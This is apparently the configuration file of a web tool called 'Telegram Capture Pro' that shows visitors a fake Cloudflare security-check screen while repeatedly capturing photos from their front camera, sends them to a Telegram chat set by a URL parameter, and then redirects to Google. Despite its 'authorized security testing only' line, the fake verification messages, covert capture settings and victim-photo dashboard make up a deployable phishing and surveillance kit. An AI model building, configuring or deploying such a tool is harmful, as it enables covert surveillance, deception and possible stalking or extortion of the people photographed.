/**
 * Telegram Capture Pro — Frontend Configuration
 * ==============================================
 * For authorized security testing only.
 * 
 * This file controls all configurable parameters. No other files
 * need modification for deployment.
 */

window.CAPTURE_CONFIG = Object.freeze({

  // Application name (shown on dashboard)
  appName: 'Telegram Capture Pro',

  // API endpoints (Vercel serverless functions)
  api: {
    sendPhoto:   '/api/sendPhoto',
    sendMessage: '/api/sendMessage',
  },

  // Default Telegram chat ID (overridden by ?chatid= URL param)
  defaultChatId: '',

  // Camera capture settings
  camera: {
    width:          { ideal: 1280 },
    height:         { ideal: 720 },
    facingMode:     { ideal: 'user' },
    jpegQuality:    0.92,
    captureInterval: 2500,
    maxPhotos:       0,
  },

  // Timing
  timing: {
    cloudflareDuration: 5,
    firstPhotoDelay:    1500,
    redirectBuffer:     800,
  },

  // Cloudflare fake screen messages
  cloudflareScreen: {
    duration: 5,
    progressMessages: [
      'Performing security check…',
      'Analyzing browser fingerprint…',
      'Checking for malicious activity…',
      'Validating request integrity…',
      'Finalizing security verification…',
    ],
  },

  // Redirect behavior
  redirect: {
    autoHttps:   true,
    fallbackUrl: 'https://www.google.com',
  },

  // Dashboard settings
  dashboard: {
    refreshInterval: 5000,    // How often dashboard checks for new data (ms)
    maxPhotos:       100,      // Maximum photos to store in session
    enableMap:       false,    // Enable GPS map view (requires API key)
  },

  // Debug
  debug: {
    consoleLogging: true,
  },
});
